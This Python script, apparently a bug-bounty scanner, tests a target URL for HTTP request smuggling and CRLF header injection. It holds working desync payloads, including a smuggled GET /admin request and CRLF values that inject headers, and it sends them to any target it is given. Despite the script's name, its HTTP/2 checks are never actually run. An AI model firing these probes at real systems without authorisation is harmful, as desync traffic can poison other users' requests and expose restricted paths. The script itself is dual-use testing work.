#!/usr/bin/env python3
"""
h2_smuggler.py — HTTP/2 Request Smuggling Tester

Tests for HTTP desync attacks: CL.TE, TE.CL, H2.CL, H2.TE.
Very few hunters test this — $10K-$75K payouts.

Usage:
    python3 h2_smuggler.py --url https://target.com
"""
import json
import os
import re
import socket
import ssl
import time
from pathlib import Path
from urllib.parse import urlparse

try:
    import requests
except ImportError:
    requests = None

# ── Smuggling Payloads ─────────────────────────────────────────────────────────

SMUGGLE_PAYLOADS = {
    "cl_te": {
        "description": "Content-Length vs Transfer-Encoding desync",
        "headers": {
            "Content-Length": "6",
            "Transfer-Encoding": "chunked",
        },
        "body": "0\r\n\r\nG",
        "verify": "Look for 'GPOST' or 405/400 on next request",
        "severity": "CRITICAL",
    },
    "te_cl": {
        "description": "Transfer-Encoding vs Content-Length desync",
        "headers": {
            "Transfer-Encoding": "chunked",
            "Content-Length": "3",
        },
        "body": "8\r\nSMUGGLED\r\n0\r\n\r\n",
        "verify": "Backend processes 'SMUGGLED' prefix",
        "severity": "CRITICAL",
    },
    "te_te_obfuscation": {
        "description": "TE obfuscation — different servers parse differently",
        "variants": [
            {"Transfer-Encoding": "chunked", "Transfer-encoding": "x"},
            {"Transfer-Encoding": "xchunked"},
            {"Transfer-Encoding": " chunked"},
            {"Transfer-Encoding": "chunked\t"},
            {"Transfer-Encoding": "chunked\x00"},
            {"Transfer-Encoding": ["chunked", "identity"]},
            {"Transfer-Encoding": "chunked\r\nTransfer-Encoding: x"},
        ],
        "severity": "CRITICAL",
    },
    "h2_cl": {
        "description": "HTTP/2 to HTTP/1.1 Content-Length desync",
        "note": "Inject via H2 pseudo-header smuggling",
        "headers": {
            "Content-Length": "0",
        },
        "h2_body": "GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n",
        "severity": "CRITICAL",
    },
}

# ── Header Injection Payloads ──────────────────────────────────────────────────

HEADER_INJECTIONS = [
    # CRLF injection in header values
    {"header": "Foo", "value": "bar\r\nTransfer-Encoding: chunked"},
    {"header": "Foo", "value": "bar\r\n\r\nGET /admin HTTP/1.1\r\nHost: target"},
    # Null byte injection
    {"header": "Foo", "value": "bar\x00\r\nX-Injected: true"},
    # Header name injection via H2
    {"header": "host\r\nTransfer-Encoding: chunked\r\nx", "value": "bar"},
]


class H2Smuggler:
    """HTTP/2 and HTTP/1.1 request smuggling detector."""

    def __init__(self):
        self.findings = []
        self.session = requests.Session() if requests else None

    def detect_http2(self, url: str) -> dict:
        """Check if target supports HTTP/2."""
        parsed = urlparse(url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)

        result = {"http2": False, "http11": False, "protocols": []}

        if parsed.scheme == "https":
            try:
                ctx = ssl.create_default_context()
                ctx.set_alpn_protocols(["h2", "http/1.1"])
                conn = ctx.wrap_socket(
                    socket.socket(socket.AF_INET, socket.SOCK_STREAM),
                    server_hostname=host)
                conn.settimeout(5)
                conn.connect((host, port))
                protocol = conn.selected_alpn_protocol()
                conn.close()

                if protocol:
                    result["protocols"].append(protocol)
                    if protocol == "h2":
                        result["http2"] = True
                    if protocol == "http/1.1":
                        result["http11"] = True
            except Exception:
                pass

        return result

    def test_cl_te(self, url: str, headers: dict = None) -> dict:
        """Test CL.TE desync vulnerability."""
        headers = headers or {}
        result = {
            "type": "CL.TE", "url": url,
            "vulnerable": False, "evidence": [],
        }

        # Step 1: Send CL.TE probe
        probe_headers = {
            **headers,
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "6",
            "Transfer-Encoding": "chunked",
        }
        probe_body = "0\r\n\r\nG"

        try:
            resp1 = self.session.post(
                url, headers=probe_headers, data=probe_body.encode(),
                timeout=10, allow_redirects=False)

            # Step 2: Send normal follow-up request
            time.sleep(0.5)
            resp2 = self.session.get(url, headers=headers, timeout=5)

            # If follow-up gets poisoned (unexpected method/path)
            if resp2.status_code in (400, 405, 501):
                result["vulnerable"] = True
                result["evidence"].append({
                    "probe_status": resp1.status_code,
                    "followup_status": resp2.status_code,
                    "indicator": "Follow-up request returned unexpected status (poisoned)",
                })
                result["severity"] = "CRITICAL"

            # Check timing difference
            t0 = time.time()
            try:
                resp3 = self.session.post(
                    url, headers=probe_headers, data=probe_body.encode(),
                    timeout=10, allow_redirects=False)
                elapsed = time.time() - t0
                if elapsed > 5:  # Backend waited for more chunked data
                    result["vulnerable"] = True
                    result["evidence"].append({
                        "timing": f"{elapsed:.1f}s delay",
                        "indicator": "Server timed out waiting for chunked data (desync likely)",
                    })
            except requests.exceptions.Timeout:
                result["vulnerable"] = True
                result["evidence"].append({
                    "indicator": "Request timed out — server waiting for chunked data",
                })

        except Exception as e:
            result["error"] = str(e)

        if result["vulnerable"]:
            self.findings.append(result)
        return result

    def test_te_cl(self, url: str, headers: dict = None) -> dict:
        """Test TE.CL desync vulnerability."""
        headers = headers or {}
        result = {
            "type": "TE.CL", "url": url,
            "vulnerable": False, "evidence": [],
        }

        probe_headers = {
            **headers,
            "Content-Type": "application/x-www-form-urlencoded",
            "Transfer-Encoding": "chunked",
            "Content-Length": "3",
        }
        probe_body = "8\r\nSMUGGLED\r\n0\r\n\r\n"

        try:
            resp1 = self.session.post(
                url, headers=probe_headers, data=probe_body.encode(),
                timeout=10, allow_redirects=False)

            time.sleep(0.5)
            resp2 = self.session.get(url, headers=headers, timeout=5)

            if resp2.status_code in (400, 405, 501):
                result["vulnerable"] = True
                result["evidence"].append({
                    "probe_status": resp1.status_code,
                    "followup_status": resp2.status_code,
                    "indicator": "Follow-up poisoned by smuggled prefix",
                })
                result["severity"] = "CRITICAL"

        except Exception as e:
            result["error"] = str(e)

        if result["vulnerable"]:
            self.findings.append(result)
        return result

    def test_te_obfuscation(self, url: str, headers: dict = None) -> dict:
        """Test Transfer-Encoding obfuscation variants."""
        headers = headers or {}
        result = {
            "type": "TE Obfuscation", "url": url,
            "hits": [], "vulnerable": False,
        }

        payload = SMUGGLE_PAYLOADS["te_te_obfuscation"]
        for variant in payload["variants"]:
            if isinstance(variant, dict):
                test_headers = {**headers, **variant}
                test_headers["Content-Length"] = "6"

                try:
                    resp = self.session.post(
                        url, headers=test_headers, data="0\r\n\r\nG".encode(),
                        timeout=8, allow_redirects=False)

                    if resp.status_code in (400, 500):
                        # Server confused by TE variant
                        result["hits"].append({
                            "variant": str(variant),
                            "status": resp.status_code,
                            "indicator": "Server rejected TE variant (parsing difference detected)",
                        })
                except Exception:
                    continue

            time.sleep(0.3)

        if len(result["hits"]) >= 2:
            result["vulnerable"] = True
            result["severity"] = "HIGH"
            self.findings.append(result)

        return result

    def test_crlf_injection(self, url: str, headers: dict = None) -> dict:
        """Test CRLF injection in header values."""
        headers = headers or {}
        result = {
            "type": "CRLF Header Injection", "url": url,
            "hits": [], "vulnerable": False,
        }

        for inj in HEADER_INJECTIONS:
            test_headers = dict(headers)
            test_headers[inj["header"]] = inj["value"]

            try:
                resp = self.session.get(
                    url, headers=test_headers, timeout=8,
                    allow_redirects=False)

                # Check for injected header reflection
                if "X-Injected" in str(resp.headers):
                    result["hits"].append({
                        "payload": inj["value"][:50],
                        "indicator": "Injected header appeared in response",
                    })
                    result["vulnerable"] = True

            except Exception:
                continue

            time.sleep(0.2)

        if result["vulnerable"]:
            result["severity"] = "HIGH"
            self.findings.append(result)

        return result

    def run_all(self, url: str, headers: dict = None) -> dict:
        """Run all smuggling tests."""
        h2 = self.detect_http2(url)
        results = {
            "url": url,
            "http2_supported": h2["http2"],
            "protocols": h2["protocols"],
            "tests": {},
            "vulnerable": False,
        }

        results["tests"]["cl_te"] = self.test_cl_te(url, headers)
        results["tests"]["te_cl"] = self.test_te_cl(url, headers)
        results["tests"]["te_obfuscation"] = self.test_te_obfuscation(url, headers)
        results["tests"]["crlf"] = self.test_crlf_injection(url, headers)

        for test_name, test_result in results["tests"].items():
            if test_result.get("vulnerable"):
                results["vulnerable"] = True
                break

        return results

    def save_findings(self, target: str) -> None:
        out_dir = Path(f"findings/{target}/smuggling")
        out_dir.mkdir(parents=True, exist_ok=True)
        if self.findings:
            out_file = out_dir / f"smuggling_{int(time.time())}.json"
            out_file.write_text(json.dumps(self.findings, indent=2, default=str))
